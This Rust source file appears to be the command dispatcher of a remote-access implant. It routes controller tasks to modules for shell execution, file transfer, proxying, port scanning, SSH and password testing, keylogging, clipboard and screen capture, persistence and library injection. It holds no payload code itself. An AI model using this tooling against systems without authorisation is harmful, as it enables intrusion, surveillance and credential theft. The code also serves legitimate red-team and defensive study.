// Command implementations
pub mod shell;
pub mod run;
pub mod ls;
pub mod ps;
pub mod cat;
pub mod cd;
pub mod chmod;
pub mod cp;
pub mod head;
pub mod tail;
pub mod mkdir;
pub mod mv;
pub mod pwd;
pub mod rm;
pub mod drives;
pub mod getenv;
pub mod setenv;
pub mod unsetenv;
pub mod getuser;
pub mod ifconfig;
pub mod download;
pub mod upload;
pub mod sleep_cmd;
pub mod exit;
pub mod jobs;
pub mod jobkill;
pub mod listtasks;
pub mod config;
pub mod print_c2;
pub mod print_p2p;
pub mod update_c2;
pub mod socks;
pub mod rpfwd;
pub mod pty;
pub mod portscan;
pub mod ssh;
pub mod sshauth;
pub mod link_tcp;
pub mod unlink_tcp;
pub mod link_webshell;
pub mod unlink_webshell;
pub mod curl_cmd;
pub mod sudo;
pub mod triagedirectory;
pub mod execute_library;
pub mod test_password;
pub mod keys;
pub mod download_bulk;

// macOS-only commands
#[cfg(target_os = "macos")]
pub mod screencapture;
#[cfg(target_os = "macos")]
pub mod clipboard;
#[cfg(target_os = "macos")]
pub mod clipboard_monitor;
#[cfg(target_os = "macos")]
pub mod tcc_check;
#[cfg(target_os = "macos")]
pub mod list_entitlements;
#[cfg(target_os = "macos")]
pub mod lsopen;
#[cfg(target_os = "macos")]
pub mod persist_launchd;
#[cfg(target_os = "macos")]
pub mod persist_loginitem;
#[cfg(target_os = "macos")]
pub mod xpc;
#[cfg(target_os = "macos")]
pub mod libinject;
#[cfg(target_os = "macos")]
pub mod jxa;
#[cfg(target_os = "macos")]
pub mod jsimport;
#[cfg(target_os = "macos")]
pub mod jsimport_call;
#[cfg(target_os = "macos")]
pub mod prompt;
#[cfg(target_os = "macos")]
pub mod caffeinate;

// Linux-only commands
#[cfg(target_os = "linux")]
pub mod keylog;

use crate::structs::Task;
use crate::utils;

/// Dispatch a task to the appropriate command handler
pub async fn dispatch(task: Task) {
    let command = task.data.command.as_str();
    utils::print_debug(&format!(
        "dispatch: command='{}' task_id='{}' params_len={}",
        command, task.data.task_id, task.data.params.len()
    ));
    match command {
        "shell" => shell::execute(task).await,
        "run" => run::execute(task).await,
        "ls" => ls::execute(task).await,
        "ps" => ps::execute(task).await,
        "cat" => cat::execute(task).await,
        "cd" => cd::execute(task).await,
        "chmod" => chmod::execute(task).await,
        "cp" => cp::execute(task).await,
        "head" => head::execute(task).await,
        "tail" => tail::execute(task).await,
        "mkdir" => mkdir::execute(task).await,
        "mv" => mv::execute(task).await,
        "pwd" => pwd::execute(task).await,
        "rm" => rm::execute(task).await,
        "drives" => drives::execute(task).await,
        "getenv" => getenv::execute(task).await,
        "setenv" => setenv::execute(task).await,
        "unsetenv" => unsetenv::execute(task).await,
        "getuser" => getuser::execute(task).await,
        "ifconfig" => ifconfig::execute(task).await,
        "download" => download::execute(task).await,
        "download_bulk" => download_bulk::execute(task).await,
        "upload" => upload::execute(task).await,
        "sleep" => sleep_cmd::execute(task).await,
        "exit" => exit::execute(task).await,
        "jobs" => jobs::execute(task).await,
        "jobkill" => jobkill::execute(task).await,
        "listtasks" => listtasks::execute(task).await,
        "config" => config::execute(task).await,
        "print_c2" => print_c2::execute(task).await,
        "print_p2p" => print_p2p::execute(task).await,
        "update_c2" => update_c2::execute(task).await,
        "socks" => socks::execute(task).await,
        "rpfwd" => rpfwd::execute(task).await,
        "pty" => pty::execute(task).await,
        "portscan" => portscan::execute(task).await,
        "ssh" => ssh::execute(task).await,
        "sshauth" => sshauth::execute(task).await,
        "link_tcp" => link_tcp::execute(task).await,
        "unlink_tcp" => unlink_tcp::execute(task).await,
        "link_webshell" => link_webshell::execute(task).await,
        "unlink_webshell" => unlink_webshell::execute(task).await,
        "curl" => curl_cmd::execute(task).await,
        "sudo" => sudo::execute(task).await,
        "triagedirectory" => triagedirectory::execute(task).await,
        "execute_library" => execute_library::execute(task).await,
        "test_password" => test_password::execute(task).await,
        "keys" => keys::execute(task).await,

        // macOS-only commands
        #[cfg(target_os = "macos")]
        "screencapture" => screencapture::execute(task).await,
        #[cfg(target_os = "macos")]
        "clipboard" => clipboard::execute(task).await,
        #[cfg(target_os = "macos")]
        "clipboard_monitor" => clipboard_monitor::execute(task).await,
        #[cfg(target_os = "macos")]
        "tcc_check" => tcc_check::execute(task).await,
        #[cfg(target_os = "macos")]
        "list_entitlements" => list_entitlements::execute(task).await,
        #[cfg(target_os = "macos")]
        "lsopen" => lsopen::execute(task).await,
        #[cfg(target_os = "macos")]
        "persist_launchd" => persist_launchd::execute(task).await,
        #[cfg(target_os = "macos")]
        "persist_loginitem" => persist_loginitem::execute(task).await,
        #[cfg(target_os = "macos")]
        "xpc" | "xpc_service" | "xpc_submit" | "xpc_status" | "xpc_start" | "xpc_stop"
        | "xpc_remove" => xpc::execute(task).await,
        #[cfg(target_os = "macos")]
        "libinject" => libinject::execute(task).await,
        #[cfg(target_os = "macos")]
        "jxa" => jxa::execute(task).await,
        #[cfg(target_os = "macos")]
        "jsimport" => jsimport::execute(task).await,
        #[cfg(target_os = "macos")]
        "jsimport_call" => jsimport_call::execute(task).await,
        #[cfg(target_os = "macos")]
        "prompt" => prompt::execute(task).await,
        #[cfg(target_os = "macos")]
        "caffeinate" => caffeinate::execute(task).await,

        // Linux-only commands
        #[cfg(target_os = "linux")]
        "keylog" => keylog::execute(task).await,

        _ => {
            let mut response = task.new_response();
            response.set_error(&format!("Unknown command: {}", command));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        }
    }
}
